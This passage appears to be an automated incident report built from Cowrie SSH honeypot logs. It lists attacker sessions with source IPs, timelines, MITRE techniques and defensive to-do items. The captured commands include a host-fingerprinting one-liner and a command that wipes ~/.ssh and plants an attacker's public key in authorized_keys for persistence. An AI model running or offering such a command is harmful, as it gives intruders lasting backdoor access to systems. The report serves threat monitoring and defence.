| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.success` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
| `2026-08-12 05:24:15` | `cowrie.log.closed` |
| `2026-08-12 05:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f106ad7cc8ca

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:26 |
| **Last Seen** | 2026-08-12 05:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:26:34` | `cowrie.session.connect` |
| `2026-08-12 05:26:34` | `cowrie.client.version` |
| `2026-08-12 05:26:34` | `cowrie.client.kex` |
| `2026-08-12 05:26:35` | `cowrie.login.success` |
| `2026-08-12 05:26:36` | `cowrie.session.params` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.success` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:36` | `cowrie.command.input` |
| `2026-08-12 05:26:37` | `cowrie.log.closed` |
| `2026-08-12 05:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3dfe567fdea

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:29 |
| **Last Seen** | 2026-08-12 05:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:29:04` | `cowrie.session.connect` |
| `2026-08-12 05:29:04` | `cowrie.client.version` |
| `2026-08-12 05:29:04` | `cowrie.client.kex` |
| `2026-08-12 05:29:04` | `cowrie.login.success` |
| `2026-08-12 05:29:06` | `cowrie.session.params` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.success` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.command.input` |
| `2026-08-12 05:29:06` | `cowrie.log.closed` |
| `2026-08-12 05:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f41cf5fb45f

| Field | Detail |
|---|---|
| **Source IP** | `34.76.177[.]222` |
| **First Seen** | 2026-08-12 05:29 |
| **Last Seen** | 2026-08-12 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:29:16` | `cowrie.session.connect` |
| `2026-08-12 05:29:16` | `cowrie.login.success` |
| `2026-08-12 05:29:17` | `cowrie.session.params` |
| `2026-08-12 05:29:17` | `cowrie.command.input` |
| `2026-08-12 05:29:17` | `cowrie.command.input` |
| `2026-08-12 05:29:17` | `cowrie.command.failed` |
| `2026-08-12 05:29:17` | `cowrie.command.input` |
| `2026-08-12 05:29:17` | `cowrie.log.closed` |
| `2026-08-12 05:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.177[.]222` to AbuseIPDB if not already reported
- [ ] Block `34.76.177[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e19748d78efe

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-08-12 05:29 |
| **Last Seen** | 2026-08-12 05:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:29:29` | `cowrie.session.connect` |
| `2026-08-12 05:29:29` | `cowrie.client.version` |
| `2026-08-12 05:29:29` | `cowrie.client.kex` |
| `2026-08-12 05:29:31` | `cowrie.login.success` |
| `2026-08-12 05:29:31` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc1a8e26902

| Field | Detail |
|---|---|
| **Source IP** | `34.76.177[.]222` |
| **First Seen** | 2026-08-12 05:29 |
| **Last Seen** | 2026-08-12 05:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:29:30` | `cowrie.session.connect` |
| `2026-08-12 05:29:30` | `cowrie.login.success` |
| `2026-08-12 05:29:30` | `cowrie.session.params` |
| `2026-08-12 05:29:30` | `cowrie.command.input` |
| `2026-08-12 05:29:30` | `cowrie.command.failed` |
| `2026-08-12 05:29:41` | `cowrie.log.closed` |
| `2026-08-12 05:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.177[.]222` to AbuseIPDB if not already reported
- [ ] Block `34.76.177[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7888c8ccd87a

| Field | Detail |
|---|---|
| **Source IP** | `34.76.177[.]222` |
| **First Seen** | 2026-08-12 05:29 |
| **Last Seen** | 2026-08-12 05:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:29:32` | `cowrie.session.connect` |
| `2026-08-12 05:29:32` | `cowrie.login.success` |
| `2026-08-12 05:29:32` | `cowrie.session.params` |
| `2026-08-12 05:29:32` | `cowrie.command.input` |
| `2026-08-12 05:29:41` | `cowrie.log.closed` |
| `2026-08-12 05:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.177[.]222` to AbuseIPDB if not already reported
- [ ] Block `34.76.177[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ba1cd703bc1

| Field | Detail |
|---|---|
| **Source IP** | `117.50.208[.]104` |
| **First Seen** | 2026-08-12 05:30 |
| **Last Seen** | 2026-08-12 05:35 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:30:50` | `cowrie.session.connect` |
| `2026-08-12 05:30:51` | `cowrie.client.version` |
| `2026-08-12 05:30:52` | `cowrie.client.kex` |
| `2026-08-12 05:30:53` | `cowrie.login.success` |
| `2026-08-12 05:35:53` | `cowrie.session.file_upload` |
| `2026-08-12 05:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.208[.]104` to AbuseIPDB if not already reported
- [ ] Block `117.50.208[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce38263e9319

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-08-12 05:30 |
| **Last Seen** | 2026-08-12 05:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:30:59` | `cowrie.session.connect` |
| `2026-08-12 05:31:00` | `cowrie.client.version` |
| `2026-08-12 05:31:00` | `cowrie.client.kex` |
| `2026-08-12 05:31:01` | `cowrie.login.success` |
| `2026-08-12 05:31:02` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae45e9a4a1fe

| Field | Detail |
|---|---|
| **Source IP** | `122.160.50[.]155` |
| **First Seen** | 2026-08-12 05:31 |
| **Last Seen** | 2026-08-12 05:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:31:07` | `cowrie.session.connect` |
| `2026-08-12 05:31:08` | `cowrie.client.version` |
| `2026-08-12 05:31:08` | `cowrie.client.kex` |
| `2026-08-12 05:31:10` | `cowrie.login.success` |
| `2026-08-12 05:31:11` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.50[.]155` to AbuseIPDB if not already reported
- [ ] Block `122.160.50[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5029b4762579

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:31 |
| **Last Seen** | 2026-08-12 05:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:31:34` | `cowrie.session.connect` |
| `2026-08-12 05:31:35` | `cowrie.client.version` |
| `2026-08-12 05:31:35` | `cowrie.client.kex` |
| `2026-08-12 05:31:35` | `cowrie.login.success` |
| `2026-08-12 05:31:37` | `cowrie.session.params` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.success` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.command.input` |
| `2026-08-12 05:31:37` | `cowrie.log.closed` |
| `2026-08-12 05:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c4e19f9528c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:34 |
| **Last Seen** | 2026-08-12 05:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:34:12` | `cowrie.session.connect` |
| `2026-08-12 05:34:12` | `cowrie.client.version` |
| `2026-08-12 05:34:13` | `cowrie.client.kex` |
| `2026-08-12 05:34:13` | `cowrie.login.success` |
| `2026-08-12 05:34:14` | `cowrie.session.params` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.success` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.command.input` |
| `2026-08-12 05:34:14` | `cowrie.log.closed` |
| `2026-08-12 05:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc8dde12c5ef

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:36 |
| **Last Seen** | 2026-08-12 05:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:36:48` | `cowrie.session.connect` |
| `2026-08-12 05:36:48` | `cowrie.client.version` |
| `2026-08-12 05:36:48` | `cowrie.client.kex` |
| `2026-08-12 05:36:49` | `cowrie.login.success` |
| `2026-08-12 05:36:50` | `cowrie.session.params` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.success` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.command.input` |
| `2026-08-12 05:36:50` | `cowrie.log.closed` |
| `2026-08-12 05:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a299fe229262

| Field | Detail |
|---|---|
| **Source IP** | `207.154.230[.]149` |
| **First Seen** | 2026-08-12 05:38 |
| **Last Seen** | 2026-08-12 05:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:38:47` | `cowrie.session.connect` |
| `2026-08-12 05:38:47` | `cowrie.client.version` |
| `2026-08-12 05:38:47` | `cowrie.client.kex` |
| `2026-08-12 05:38:48` | `cowrie.login.success` |
| `2026-08-12 05:38:49` | `cowrie.session.params` |
| `2026-08-12 05:38:49` | `cowrie.command.input` |
| `2026-08-12 05:38:49` | `cowrie.command.failed` |
| `2026-08-12 05:38:49` | `cowrie.log.closed` |
| `2026-08-12 05:38:50` | `cowrie.session.params` |
| `2026-08-12 05:38:50` | `cowrie.command.input` |
| `2026-08-12 05:38:50` | `cowrie.session.file_download` |
| `2026-08-12 05:38:50` | `cowrie.log.closed` |
| `2026-08-12 05:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.230[.]149` to AbuseIPDB if not already reported
- [ ] Block `207.154.230[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd5ba3dda14

| Field | Detail |
|---|---|
| **Source IP** | `207.154.230[.]149` |
| **First Seen** | 2026-08-12 05:38 |
| **Last Seen** | 2026-08-12 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:38:50` | `cowrie.session.connect` |
| `2026-08-12 05:38:50` | `cowrie.client.version` |
| `2026-08-12 05:38:50` | `cowrie.client.kex` |
| `2026-08-12 05:38:50` | `cowrie.login.success` |
| `2026-08-12 05:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.230[.]149` to AbuseIPDB if not already reported
- [ ] Block `207.154.230[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aba54d454d6

| Field | Detail |
|---|---|
| **Source IP** | `207.154.230[.]149` |
| **First Seen** | 2026-08-12 05:38 |
| **Last Seen** | 2026-08-12 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:38:51` | `cowrie.session.connect` |
| `2026-08-12 05:38:51` | `cowrie.client.version` |
| `2026-08-12 05:38:51` | `cowrie.client.kex` |
| `2026-08-12 05:38:51` | `cowrie.login.success` |
| `2026-08-12 05:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.230[.]149` to AbuseIPDB if not already reported
- [ ] Block `207.154.230[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f30de93c553e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:39 |
| **Last Seen** | 2026-08-12 05:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:39:02` | `cowrie.session.connect` |
| `2026-08-12 05:39:02` | `cowrie.client.version` |
| `2026-08-12 05:39:02` | `cowrie.client.kex` |
| `2026-08-12 05:39:03` | `cowrie.login.success` |
| `2026-08-12 05:39:03` | `cowrie.session.params` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.success` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:03` | `cowrie.command.input` |
| `2026-08-12 05:39:04` | `cowrie.log.closed` |
| `2026-08-12 05:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e85cbb043b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:41 |
| **Last Seen** | 2026-08-12 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:41:20` | `cowrie.session.connect` |
| `2026-08-12 05:41:20` | `cowrie.client.version` |
| `2026-08-12 05:41:20` | `cowrie.client.kex` |
| `2026-08-12 05:41:21` | `cowrie.login.success` |
| `2026-08-12 05:41:22` | `cowrie.session.params` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.success` |
